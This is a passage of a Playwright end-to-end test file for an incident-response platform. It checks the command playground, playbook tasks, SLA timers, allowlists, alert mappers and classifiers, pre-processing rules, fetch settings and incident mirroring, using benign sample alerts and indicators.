  // The chips are those that mean something with no incident.
  await expect(room.getByRole('group', { name: 'Show' }).getByRole('button')).toHaveText(['All', 'Notes', 'Commands'])

  // The same line as the War Room: completion, hints, the result under the command, its inspector.
  await line.fill('!nik-get-ind')
  await expect(room.getByRole('listbox', { name: 'Commands' }).getByRole('option')).toHaveText([/!nik-get-indicator/])
  await line.press('Tab')
  await expect(room.getByLabel('Arguments of the command')).toContainText('value=')
  await line.pressSequentially('185.220.101.47')
  await line.press('Enter')
  const result = stream
    .getByRole('listitem')
    .filter({ hasText: /nik-get-indicator/ })
    .nth(1)
  await expect(result).toBeVisible({ timeout: 20_000 })
  await result.getByRole('button').first().click()
  const inspector = room.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector.getByRole('heading', { name: 'Result' })).toBeVisible()
  // Nothing here is evidence of anything.
  await expect(inspector.getByRole('button', { name: /evidence/i })).toHaveCount(0)
  await inspector.getByRole('button', { name: 'Close the entry' }).click()

  // A note to oneself; what is about an incident is refused, and is not offered.
  await line.fill('try the mail instance tomorrow')
  await line.press('Enter')
  await expect(stream).toContainText('try the mail instance tomorrow')
  await line.fill('/')
  await expect(room.getByRole('listbox', { name: 'Commands' }).getByRole('option')).toHaveText([/\/note/])
  await line.fill('/close')
  await line.press('Enter')
  await expect(room.getByRole('alert').filter({ hasText: 'about an incident' })).toBeVisible()
  await room.getByRole('group', { name: 'Show' }).getByRole('button', { name: 'Notes' }).click()
  await expect(stream.getByRole('listitem').filter({ hasText: 'nik-get-indicator' })).toHaveCount(0)
  await expect(stream).toContainText('try the mail instance tomorrow')
  await room.getByRole('group', { name: 'Show' }).getByRole('button', { name: 'All' }).click()

  // A command that changes something outside asks first, here too.
  await line.fill('!acme-create-ticket title="From the Playground"')
  await line.press('Enter')
  const confirm = page.getByRole('dialog', { name: 'Run this command?' })
  await expect(confirm).toContainText('acme-create-ticket changes something outside Nik')
  await confirm.getByRole('button', { name: 'Cancel' }).click()

  // The history is cleared by who owns it; no incident was made or touched.
  await room.getByRole('button', { name: 'Clear the history' }).click()
  await page
    .getByRole('dialog', { name: 'Clear the history?' })
    .getByRole('button', { name: 'Clear', exact: true })
    .click()
  await expect(stream).toContainText('Nothing here yet')
  expect((await (await page.request.get('/api/playground')).json()).entries).toEqual([])
  expect((await (await page.request.get('/api/incidents')).json()).incidents.length).toBe(before)
  await room.getByRole('button', { name: 'Close the playground' }).click()
  await expect(page).not.toHaveURL(/\/playground/)
})

test('a playbook gives tasks and asks questions: My tasks, the work plan of the incident, a task added by hand', async () => {
  test.setTimeout(240_000) // the worker takes a step every second or so
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')

  // A playbook that asks a question, then gives a task, then writes a note (made through the API).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Laptop plan' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      {
        id: 'encrypted',
        kind: 'ask',
        name: 'Encrypted?',
        position: { x: 40, y: 160 },
        config: {
          question: 'Is the disk of {{ incident.name }} encrypted?',
          choices: ['Yes', 'No'],
          inputs: [{ name: 'serial', label: 'Serial number', type: 'text', required: true }],
          assignee: { role: 'admin' },
          phase: 'Triage',
        },
      },
      {
        id: 'collect',
        kind: 'task',
        name: 'Collect',
        position: { x: 40, y: 280 },
        config: {
          title: 'Collect the laptop {{ encrypted.values.serial }}',
          instructions: 'Bag it and **label** it.\n\n- seal the bag\n- sign the form',
          assignee: { role: 'admin' },
          due: '2h',
          phase: 'Containment',
        },
      },
      {
        id: 'note',
        kind: 'action',
        name: 'Write it down',
        position: { x: 40, y: 400 },
        config: { action: 'nik.add-note', args: { text: 'Collected by {{ collect.by }}: {{ collect.comment }}' } },
      },
    ],
    edges: [
      { from: 'start', to: 'encrypted' },
      { from: 'encrypted', port: 'yes', to: 'collect' },
      { from: 'collect', port: 'done', to: 'note' },
    ],
  }
  const saved = await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })
  expect(saved.status(), await saved.text()).toBe(201)
  const started = await page.request.post(`/api/automation/playbooks/${playbookId}/run`, {
    data: { objectKind: 'incident', objectId: incidentId },
  })
  expect(started.status(), await started.text()).toBe(201)
  await expect
    .poll(async () => (await (await page.request.get('/api/tasks/count')).json()).mine, { timeout: 30_000 })
    .toBe(1)

  // My tasks: the question waits there, with its form. It cannot be sent until it is filled.
  await page.getByRole('button', { name: /^My tasks/ }).click()
  await expect(page).toHaveURL(/\/tasks\/[0-9a-f]+$/)
  const mine = page.getByRole('region', { name: 'My tasks' })
  await expect(mine.getByRole('list', { name: 'Tasks' }).getByRole('listitem')).toHaveCount(1)
  const card = mine.getByRole('article')
  await expect(card.getByRole('heading', { level: 2 })).toHaveText(/^Is the disk of WKS-FINANCE-01.* encrypted\?$/)
  await expect(card).toContainText('For the role admin')
  const send = card.getByRole('button', { name: 'Send the answer' })
  await expect(send).toBeDisabled()
  await expect(card).toContainText('Still needed: a choice, Serial number')
  await card.getByText('Yes', { exact: true }).click()
  await card.getByLabel(/Serial number/).fill('PF-3X1')
  await send.click()
  await expect(card.getByRole('region', { name: 'What was answered' })).toContainText('Answer')
  await expect(card.getByRole('region', { name: 'What was answered' })).toContainText('PF-3X1')
  // The incident it belongs to is one click away.
  await card.getByRole('button', { name: /WKS-FINANCE-01/ }).click()
  await expect(page).toHaveURL(/\/incident\//)

  // The work plan of the incident: the steps of the playbook under its phases, each with what happened.
  await tabs.getByRole('button', { name: 'Work plan', exact: true }).click()
  const plan = page.getByRole('region', { name: 'Plan of Laptop plan' })
  await expect(plan.getByRole('group', { name: 'Triage' })).toContainText('answered')
  const containment = plan.getByRole('group', { name: 'Containment' })
  const open = containment.getByRole('button', { name: 'Open the task Collect the laptop PF-3X1' })
  await expect(open).toBeVisible({ timeout: 30_000 })
  await expect(open).toContainText('to do')
  await expect(open).toContainText('due in 2 h')
  await expect(plan.getByRole('group', { name: 'Other steps' })).toContainText('not reached')

  // The same plan as the graph of the playbook, and back.
  const how = page.getByRole('group', { name: 'Show the plan as' })
  await how.getByRole('button', { name: 'Graph' }).click()
  await expect(plan.getByTestId('playbook-canvas')).toContainText('Collect')
  await expect(plan.getByTestId('playbook-canvas')).toContainText('for the role admin')
  await how.getByRole('button', { name: 'List' }).click()

  // The task is done from the plan: its instructions, a comment.
  await open.click()
  const dialog = page.getByRole('dialog', { name: 'Task' })
  await expect(dialog.getByRole('region', { name: 'Instructions' }).locator('strong')).toHaveText('label')
  await expect(dialog.getByRole('region', { name: 'Instructions' }).getByRole('listitem')).toHaveCount(2)
  await dialog.getByLabel('Comment').fill('In the safe')
  await dialog.getByRole('button', { name: 'Mark as done' }).click()
  await expect(dialog.getByRole('region', { name: 'What was answered' })).toContainText('In the safe')
  await dialog.getByRole('button', { name: 'Close' }).click()
  // The playbook goes on to its end.
  await expect(plan).toContainText('3 of 3 steps', { timeout: 30_000 })
  await expect(plan.getByRole('group', { name: 'Other steps' })).toContainText('done')

  // A task added by hand, for the owner of the incident.
  await page.getByRole('button', { name: 'Add a task' }).click()
  const adding = page.getByRole('dialog', { name: 'Add a task' })
  await adding.getByLabel(/What to do/).fill('Tell legal')
  await adding.getByLabel('Due in').fill('3d')
  await adding.getByRole('button', { name: 'Add the task' }).click()
  const byHand = page.getByRole('region', { name: 'Tasks added by hand' })
  await expect(byHand.getByRole('button', { name: 'Open the task Tell legal' })).toContainText('due in 3 d')

  // The War Room tells it all, and the note of the playbook is there.
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  await expect(stream.getByRole('listitem').filter({ hasText: 'done: In the safe' })).toHaveCount(1)
  await expect(stream.getByRole('listitem').filter({ hasText: /Collected by .*: In the safe/ })).toHaveCount(1)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
})

test('a type times its incidents: the SLA in Settings, the timers on the incident, what the account was told', async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  const incident = await (await page.request.get(`/api/incidents/${incidentId}`)).json()
  const typeId = incident.type || 'unclassified'

  // Settings → Incidents → SLA: one hour and a half to contain, for the type of the open incident.
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('SLA', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/sla$/)
  await settings.locator('#sla-type').selectOption(typeId)
  const table = settings.getByRole('table', { name: /^The SLA of / })
  const contain = table.getByRole('row').filter({ hasText: 'time_to_contain' })
  const minutes = contain.getByLabel('Time to contain: minutes allowed', { exact: true })
  await expect(minutes).toBeDisabled()
  await contain.getByRole('checkbox').first().check()
  const save = settings.getByRole('button', { name: /^Save the SLA of / })
  // Switched on with no time: it says what is missing.
  await expect(settings.getByRole('alert')).toContainText('Time to contain: say how many minutes are allowed')
  await expect(save).toBeDisabled()
  await minutes.fill('90')
  await contain.getByLabel('Time to contain: minutes allowed if critical').fill('15')
  await save.click()
  await expect(settings.getByRole('status')).toContainText('Saved.')
  await page.getByRole('button', { name: 'Close settings' }).click()

  // The incident shows its timer beside the tabs; it is paused and started again by hand.
  const timers = page.getByRole('region', { name: 'SLA timers' })
  const timer = timers.getByRole('listitem').filter({ hasText: 'Time to contain' })
  await expect(timer).toContainText(/left · of 1 h 30 min/)
  await timer.getByRole('button', { name: 'Pause Time to contain' }).click()
  await expect(timer).toContainText('paused at')
  await timer.getByRole('button', { name: 'Start Time to contain' }).click()
  await expect(timer).toContainText(/left · of 1 h 30 min/)
  await timer.getByRole('button', { name: 'Stop Time to contain' }).click()
  await expect(timer).toContainText('took')
  await expect(timer.getByRole('button', { name: 'Stop Time to contain' })).toHaveCount(0)

  // The bell: what this account was told (the approvals and tasks of the tests before), read at once.
  const bell = page.getByRole('button', { name: /^Notifications \(\d+ new\)$/ })
  await expect(bell).toBeVisible({ timeout: 45_000 })
  await bell.click()
  const told = page.getByRole('dialog', { name: 'Notifications' })
  await expect(told.getByRole('list', { name: 'Notifications' }).getByRole('listitem').first()).toContainText('new')
  await told.getByRole('button', { name: 'Mark all as read' }).click()
  await expect(told.getByRole('button', { name: 'Mark all as read' })).toBeDisabled()
  await told.getByRole('button', { name: 'Close' }).click()
  await expect(page.getByRole('button', { name: 'Notifications', exact: true })).toBeVisible()
})

test('lists: one is made and filled in Settings, and a feature is pointed at it', async () => {
  // What a list holds, how it is exported and what refuses to delete it are the server's (tests/test_lists.py):
  // here, only what a person does on the page.
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  const openLists = () => sections.getByText('Lists', { exact: true }).last().click()
  await openLists()
  await expect(page).toHaveURL(/\/settings\/lists\/all/)
  const table = settings.getByRole('table', { name: 'Lists' })
  // The lists Nik ships are there.
  await expect(table.getByRole('row').filter({ hasText: 'ioc_allowlist' })).toContainText('Values')

  // A list of one's own, filled.
  await settings.getByRole('button', { name: 'New list' }).click()
  const dialog = page.getByRole('dialog', { name: 'New list' })
  await dialog.getByLabel('Label').fill('Strict allowlist')
  await expect(dialog.getByLabel('Name')).toHaveValue('strict_allowlist')
  await dialog.getByRole('button', { name: 'Create the list' }).click()
  const strict = settings.getByRole('article', { name: 'Strict allowlist' })
  await expect(strict).toContainText('Nothing reads this list yet.')
  await strict.getByLabel('Items, one a line').fill('only.example\n192.0.2.0/24')
  await strict.getByRole('button', { name: 'Save the items' }).click()
  await expect(strict.getByRole('status')).toHaveText('Saved.')
  await expect(table.getByRole('row').filter({ hasText: 'strict_allowlist' })).toContainText('2 items')

  // The allowlist of the indicators is pointed at it, and the list says where it is used. The choice is
  // saved by the page: the list is opened again until it shows it.
  const used = strict.getByRole('region', { name: 'Where it is used' })
  const point = async (name, expectUsed) => {
    await sections.getByText('IOC allowlist', { exact: true }).click()
    await settings.getByLabel('Allowlist: reads the list').selectOption(name)
    await expect(async () => {
      await openLists()
      await table.getByRole('button', { name: 'Strict allowlist' }).click()
      if (expectUsed) await expect(used).toContainText('Allowlist', { timeout: 2000 })
      else await expect(strict).toContainText('Nothing reads this list yet.', { timeout: 2000 })
    }).toPass({ timeout: 30_000 })
  }
  await point('strict_allowlist', true)
  // Pointed back at the one Nik ships, the list is nobody's and can be deleted.
  await point('ioc_allowlist', false)
  await strict.getByRole('button', { name: 'Delete the list' }).click()
  await expect(table.getByRole('row').filter({ hasText: 'strict_allowlist' })).toHaveCount(0)
  await page.getByRole('button', { name: 'Close settings' }).click()
})

test('the mappers and the classifier are set in the instance, tried on a sample, and saved by its one Save', async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  // Their page left the menu: the address it had opens the connectors, where the instances are.
  await expect(sections.getByText('Classifiers and mappers', { exact: true })).toHaveCount(0)
  await page.evaluate(() => {
    window.history.replaceState({}, '', '/settings/automation/classifiers-and-mappers')
    window.dispatchEvent(new PopStateEvent('popstate'))
  })
  const row = settings
    .getByRole('list', { name: 'Instances of Acme Desk' })
    .getByRole('listitem')
    .filter({ hasText: 'Acme test' })
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  const pane = settings.getByRole('complementary', { name: 'Instance Acme test' })
  const tabs = pane.getByRole('tablist', { name: 'Parts of the instance' })
  await expect(tabs.getByRole('tab')).toHaveText(['Connection', 'Keys', 'Fetch', 'Classifier', 'Mappers'])
  await tabs.getByRole('tab', { name: 'Mappers' }).click()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors\/[^/]+\/mappers$/)
  // The mappers are the connector's: the form says that every instance of it shares them.
  await expect(pane.getByRole('region', { name: 'Mapper (incoming)' })).toContainText(
    'Shared by every instance of Acme Desk',
  )
  await expect(pane.getByText('no mapper yet')).toBeVisible()

  // A sample of what the product sends, and two rules written against it.
  await settings
    .getByLabel('A sample item, as JSON')
    .fill('{"id": "T-77", "title": "Emotet on a laptop", "priority": 1, "host": {"name": "WKS-FINANCE-01"}}')
  const rules = settings.getByRole('table', { name: 'Rules of the incoming mapper' })
  await settings.getByRole('button', { name: /^Show the \d+ other fields$/ }).click()
  const name = rules.getByRole('row').filter({ hasText: /^Name/ })
  // The connector names no field: the picker offers those of the sample.
  await name.getByLabel('Name: its value: put a field in').selectOption('title')
  await expect(name.getByLabel('Name: its value', { exact: true })).toHaveValue('{{ item.title }}')
  const severity = rules.getByRole('row').filter({ hasText: /^Severity/ })
  await severity.getByLabel('Severity: its value', { exact: true }).fill("{{ item.priority | severity('inverse') }}")
  await severity.getByLabel('Severity: wins over what a person set').check()
  const host = rules.getByRole('row').filter({ hasText: /^Host/ })
  await host.getByLabel('Host: its value', { exact: true }).fill('{{ item.host.name }}')
  await settings.getByRole('button', { name: 'Add a context path' }).click()
  await settings.getByLabel('Context path 1', { exact: true }).fill('Alert(val.ID == obj.ID)')
  await settings.getByLabel('Context path 1: its value', { exact: true }).fill('{"ID": "{{ item.id }}"}')

  // Tried on the sample: each row shows the value the incident would get. Nothing is written.
  await settings.getByRole('button', { name: 'Try on the sample' }).first().click()
  await expect(name).toContainText('Emotet on a laptop')
  await expect(severity).toContainText('critical')
  await expect(host).toContainText('WKS-FINANCE-01')
  await expect(rules.getByRole('row').filter({ hasText: 'T-77' })).toHaveCount(1)
  // Nothing is saved yet: the mapper is a change of the form, kept while the other tabs are used.
  await expect(pane.getByText('changed: Save keeps it')).toBeVisible()
  await expect(pane.getByText('Not saved yet: a mapper.')).toBeVisible()

  // What a field refuses is said, and the rest goes on.
  await severity.getByLabel('Severity: its value', { exact: true }).fill('{{ item.title }}')
  await settings.getByRole('button', { name: 'Try on the sample' }).first().click()
  await expect(settings.getByRole('status').filter({ hasText: 'Severity' })).toBeVisible()
  await expect(name).toContainText('Emotet on a laptop')
  await severity.getByLabel('Severity: its value', { exact: true }).fill("{{ item.priority | severity('inverse') }}")

  // The classifier of the instance, on its own tab: the first rule that holds gives the type.
  // The sample pasted for the mapper is the one it is tried on.
  await tabs.getByRole('tab', { name: 'Classifier' }).click()
  const classifier = pane.getByRole('region', { name: 'Classifier of Acme test' })
  await expect(classifier.getByLabel('A sample item, as JSON')).toHaveValue(/Emotet on a laptop/)
  await classifier.getByRole('button', { name: 'Add a rule' }).click()
  await classifier.getByLabel('Rule 1: what to compare', { exact: true }).fill('{{ item.title }}')
  await classifier.getByLabel('Rule 1: how').selectOption('contains')
  await classifier.getByLabel('Rule 1: with what').fill('Emotet')
  await classifier.getByLabel('Rule 1: the type it becomes').selectOption('malware')
  await classifier.getByRole('button', { name: 'Try on the sample' }).click()
  await expect(classifier.getByRole('status').filter({ hasText: 'The sample becomes' })).toContainText('Malware')
  await expect(pane.getByText('Not saved yet: the classifier, a mapper.')).toBeVisible()

  // The other way: what goes to the product for an incident. The incoming mapper is still as it was left.
  await tabs.getByRole('tab', { name: 'Mappers' }).click()
  await expect(pane.getByLabel('Host: its value', { exact: true })).toHaveValue('{{ item.host.name }}')
  await settings.getByRole('group', { name: 'Direction' }).getByRole('button', { name: 'Outgoing' }).click()
  await settings.getByRole('button', { name: 'Add a name' }).click()
  await settings.getByLabel('Name 1', { exact: true }).fill('summary')
  await settings.getByLabel('summary: its value', { exact: true }).fill('{{ incident.name }} ({{ incident.status }})')
  await settings.getByLabel('The id of an incident to try the mapper on').fill(incidentId)
  await settings.getByRole('button', { name: 'Try on the sample' }).click()
  await expect(settings.getByRole('table', { name: 'Rules of the outgoing mapper' })).toContainText(
    /WKS-FINANCE-01.*\(/,
  )
  await expect(pane.getByText('Not saved yet: the classifier, 2 mappers.')).toBeVisible()
  // It was only tried: what is saved is put back, and nothing of it is kept.
  await pane.getByRole('button', { name: 'Put back what is saved' }).click()
  await expect(pane.getByText('Not saved yet: the classifier, a mapper.')).toBeVisible()

  // One Save for the instance, its classifier and the mappers.
  await pane.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(pane).toHaveCount(0) // the form closes once everything is saved
  await expect(settings.getByRole('status').filter({ hasText: 'Acme test is saved.' })).toBeVisible()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors$/)
  const kept = await page.evaluate(async () => {
    const get = async (path) => (await fetch(path, { credentials: 'include' })).json()
    const instance = (await get('/api/automation/instances')).instances.find((item) => item.name === 'Acme test')
    return {
      mappers: (await get('/api/mappers?connector=acme')).mappers.map((item) => [item.direction, item.rules.length]),
      classifier: (await get(`/api/classifiers/${instance.id}`)).rules.map((rule) => rule.type),
    }
  })
  expect(kept.mappers).toEqual([['incoming', 4]])
  expect(kept.classifier).toEqual(['malware'])
  // Opened again, the classifier is the one that was saved.
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  await tabs.getByRole('tab', { name: 'Classifier' }).click()
  await expect(classifier.getByLabel('Rule 1: with what')).toHaveValue('Emotet')
  await expect(classifier.getByText('saved', { exact: true })).toBeVisible()
  await pane.getByRole('button', { name: 'Close the instance' }).click()
  await page.getByRole('button', { name: 'Close settings' }).click()
})

test('pre-processing rules say what becomes of a fetched item before it is an incident', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByText('Pre-processing rules', { exact: true })
    .click()
  await expect(page).toHaveURL(/\/settings\/incidents\/pre-processing$/)
  await expect(settings.getByText('No rule yet: every new item becomes an incident.')).toBeVisible()

  // A rule that drops noise.
  await settings.getByRole('button', { name: 'New rule' }).click()
  const dialog = page.getByRole('dialog', { name: 'New rule' })
  await expect(dialog.getByRole('status')).toHaveText('Give the rule a name')
  await dialog.getByLabel('Name').fill('Port scans are noise')
  await dialog.getByLabel('What to compare').fill('{{ item.title }}')
  await dialog.getByLabel('How it compares').selectOption('contains')
  await dialog.getByLabel('With what').fill('Port scan')
  await dialog.getByRole('button', { name: 'Save the rule' }).click()
  // One that needs to know which incident is the same.
  await settings.getByRole('button', { name: 'New rule' }).click()
  await dialog.getByLabel('Name').fill('Same host, same case')
  await dialog.getByLabel('Then').selectOption('link_to_existing')
  await expect(dialog.getByRole('status')).toHaveText('Say which fields are the same in the incident to look for')
  await dialog.getByLabel('host', { exact: true }).check()
  await dialog.getByLabel(/Made in the last hours/).fill('48')
  await dialog.getByRole('button', { name: 'Save the rule' }).click()

  const rules = settings.getByRole('list', { name: 'Pre-processing rules' })
  await expect(rules.getByRole('listitem')).toHaveText([
    /Port scans are noise.*when all of 1: \{\{ item\.title \}\} contains Port scan: drop it/,
    /Same host, same case.*always: link it to the open incident with the same host made in the last 48 h/,
  ])
  // Their order is theirs to change; a rule is deleted.
  await rules.getByRole('button', { name: 'Move Same host, same case up' }).click()
  await expect(rules.getByRole('listitem').first()).toContainText('Same host, same case')
  await rules.getByRole('button', { name: 'Delete Same host, same case' }).click()
  await rules.getByRole('button', { name: 'Delete Port scans are noise' }).click()
  await expect(settings.getByText('No rule yet: every new item becomes an incident.')).toBeVisible()
  await page.getByRole('button', { name: 'Close settings' }).click()
})

test('fetching is set in the instance: how often, the look-back, why it fails, Resume and Reset last run', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  // Its page left the menu: the address it had opens the connectors, and typing its name finds them.
  await expect(sections.getByText('Fetch status', { exact: true })).toHaveCount(0)
  await page.evaluate(() => {
    window.history.replaceState({}, '', '/settings/automation/fetch-status')
    window.dispatchEvent(new PopStateEvent('popstate'))
  })
  const row = settings
    .getByRole('list', { name: 'Instances of Acme Desk' })
    .getByRole('listitem')
    .filter({ hasText: 'Acme test' })
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  const pane = settings.getByRole('complementary', { name: 'Instance Acme test' })
  const tabs = pane.getByRole('tablist', { name: 'Parts of the instance' })
  await tabs.getByRole('tab', { name: 'Fetch' }).click()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors\/[^/]+\/fetch$/)
  const fetching = pane.getByRole('region', { name: 'Fetch' })
  const goes = fetching.getByRole('group', { name: 'How it goes' })
  await expect(goes).toContainText('off')
  await expect(goes).toContainText('It does not fetch.')
  await expect(goes.getByRole('button', { name: 'Fetch now' })).toBeDisabled()
  // What its connector says is what it starts with.
  await expect(fetching.getByLabel('How often (seconds)')).toHaveValue('3600')
  await expect(fetching.getByLabel('First fetch')).toHaveValue('1 days')
  await expect(fetching.getByLabel('Look-back (minutes)')).toHaveValue('0')

  // Turned on, with its own interval and look-back; what cannot be saved is said, and Save waits.
  await fetching.getByRole('switch', { name: 'Fetch incidents' }).click()
  await fetching.getByLabel('How often (seconds)').fill('5')
  await expect(pane.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()
  await expect(pane).toContainText('Fetching: how often is a number of seconds, 30 at the least')
  await fetching.getByLabel('How often (seconds)').fill('900')
  await fetching.getByLabel('Look-back (minutes)').fill('10')
  await expect(fetching).toContainText('Each cycle asks from 10 min before the newest time it has seen.')
  await expect(goes).toContainText('It fetches once the instance is saved.')
  // The one Save of the instance keeps them, with the rest.
  await pane.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(pane).toHaveCount(0)
  await expect(settings.getByRole('status').filter({ hasText: 'Acme test is saved.' })).toBeVisible()
  const saved = await page.evaluate(async () => {
    const found = await (await fetch('/api/automation/instances', { credentials: 'include' })).json()
    return found.instances.find((item) => item.name === 'Acme test').fetch
  })
  expect(saved).toMatchObject({ enabled: true, intervalSeconds: 900, firstFetch: '1 days', lookbackMinutes: 10 })

  // Its row says that it fetches, and leads to this part of its form.
  await row.getByRole('button', { name: /^Fetching of Acme test: / }).click()
  await expect(fetching.getByLabel('How often (seconds)')).toHaveValue('900')
  await expect(fetching.getByLabel('Look-back (minutes)')).toHaveValue('10')
  // There is no Acme Desk to answer: the cycle fails, and the form says why.
  await goes.getByRole('button', { name: 'Fetch now' }).click()
  await expect(goes).toContainText('failing', { timeout: 30_000 })
  await expect(goes.locator('.text-high-fg').first()).not.toBeEmpty()
  await goes.getByRole('button', { name: 'Resume' }).click()
  await expect(goes.getByRole('status')).toContainText('Acme test goes on.')

  // Reset last run asks first, and says what it will do.
  await goes.getByRole('button', { name: 'Reset last run…' }).click()
  const confirm = page.getByRole('dialog', { name: 'Reset the last run?' })
  await expect(confirm).toContainText(
    'The next cycle reads again from 1 days ago. What was already imported is skipped: no incident is made twice.',
  )
  await confirm.getByRole('button', { name: 'Cancel' }).click()
  await goes.getByRole('button', { name: 'Reset last run…' }).click()
  await confirm.getByRole('button', { name: 'Reset last run' }).click()
  await expect(goes.getByRole('status')).toContainText('The last run of Acme test was reset')
  await expect(goes).toContainText('the first fetch')

  // What it fetched lately: nothing yet.
  await goes.getByRole('button', { name: 'What it fetched…' }).click()
  const fetched = page.getByRole('dialog', { name: 'What Acme test fetched' })
  await expect(fetched).toContainText('Nothing fetched yet.')
  await fetched.getByRole('button', { name: 'Close', exact: true }).last().click()

  // Mirroring: the direction of the incidents it fetches. Acme Desk is only read, so None and In are
  // offered, and the two that send say why they are not.
  const mirroring = fetching.getByRole('group', { name: 'Mirroring' })
  await expect(mirroring.getByRole('radio', { name: /^None / })).toBeChecked()
  await expect(mirroring.getByRole('radio', { name: /^Out / })).toBeDisabled()
  await expect(mirroring.getByRole('radio', { name: /^In-out / })).toBeDisabled()
  await expect(mirroring).toContainText('Not offered: Acme Desk has no command that writes to the other side.')
  await mirroring.getByRole('radio', { name: /^In / }).check()
  await expect(mirroring).toContainText('Its fields follow the object on the other side. Nothing is sent.')
  await expect(mirroring).toContainText('Mirroring is None until the instance is saved.')
  // What is applied to the incidents already fetched is what is saved: not before.
  await expect(goes.getByRole('button', { name: 'Apply mirroring to open incidents…' })).toBeDisabled()

  // Put back: it does not fetch, and follows its connector again. The direction is saved with the rest.
  await fetching.getByRole('switch', { name: 'Fetch incidents' }).click()
  await fetching.getByLabel('How often (seconds)').fill('3600')
  await fetching.getByLabel('Look-back (minutes)').fill('0')
  await pane.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(pane).toHaveCount(0)
  await expect(settings.getByRole('status').filter({ hasText: 'Acme test is saved.' })).toBeVisible()
  const chosen = await page.evaluate(async () => {
    const found = await (await fetch('/api/automation/instances', { credentials: 'include' })).json()
    return found.instances.find((item) => item.name === 'Acme test').fetch.mirror
  })
  expect(chosen).toMatchObject({ direction: 'in', allow: [], offered: ['none', 'in'] })

  // Saved, it can be given to what was fetched before: the dialog counts them first. Nothing was.
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  await tabs.getByRole('tab', { name: 'Fetch' }).click()
  await expect(mirroring.getByRole('radio', { name: /^In / })).toBeChecked()
  await goes.getByRole('button', { name: 'Apply mirroring to open incidents…' }).click()
  const applying = page.getByRole('dialog', { name: 'Mirror In what was already fetched?' })
  await expect(applying).toContainText('No open incident was fetched from this instance: there is nothing to change.')
  await expect(applying.getByRole('button', { name: 'Mirror them In' })).toBeDisabled()
  await applying.getByRole('button', { name: 'Cancel' }).click()
  // And back to None, as it was.
  await mirroring.getByRole('radio', { name: /^None / }).check()
  await pane.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(pane).toHaveCount(0)
  await expect(settings.getByRole('status').filter({ hasText: 'Acme test is saved.' })).toBeVisible()
  await expect(row.getByRole('button', { name: /^Fetching of Acme test/ })).toHaveCount(0)
  // Who is told when a connection fails: the bell holds it, and it leads to the instance.
  await page.getByRole('button', { name: 'Close settings' }).click()
  await page.getByRole('button', { name: /^Notifications/ }).click()
  const told = page.getByRole('dialog', { name: 'Notifications' })
  // At least once: let go on, it may have failed a second time before it was turned off.
  await expect(told.getByRole('listitem').filter({ hasText: 'Fetching from Acme test fails' }).first()).toBeVisible({
    timeout: 45_000,
  })
  await told.getByRole('button', { name: 'Close' }).click()
})

test('an incident is mirrored with an object of another product, read now, and stopped', async () => {
  const mirror = page.getByRole('region', { name: 'Mirroring' })
  await mirror.getByRole('button', { name: 'Mirror with…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Mirror this incident' })
  await expect(dialog.getByRole('status')).toHaveText('Say which object of the other side this incident is')
  await dialog.getByLabel('The id of the object on the other side').fill('T-77')
  // Acme Desk is read, not written to: it cannot be mirrored out.
  await dialog.getByRole('radio', { name: /^In-out/ }).check()
  await expect(dialog.getByRole('status')).toHaveText('Acme Desk is read, not written to: mirror in')
  await expect(dialog.getByRole('button', { name: 'Start mirroring' })).toBeDisabled()
  await dialog.getByRole('radio', { name: /^In(?!-)/ }).check()
  await dialog.getByRole('button', { name: 'Start mirroring' }).click()
  await expect(mirror).toContainText('Acme test')
  await expect(mirror).toContainText('T-77')
  // Its direction, which can be changed here, and where it came from: a person set it on this incident.
  await expect(mirror.getByLabel('Direction of the mirror')).toHaveValue('in')
  await expect(mirror.getByLabel('Direction of the mirror').getByRole('option', { name: 'In-out' })).toBeDisabled()
  await expect(mirror).toContainText('set here')
  await expect(mirror).toContainText('Not read yet')

  // There is no Acme Desk to answer: reading now says why it could not.
  await mirror.getByRole('button', { name: 'Read now' }).click()
  await expect(mirror.getByRole('alert')).not.toBeEmpty({ timeout: 30_000 })
  // The War Room tells who started it.
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  await expect(
    page
      .getByRole('list', { name: 'War Room' })
      .getByRole('listitem')
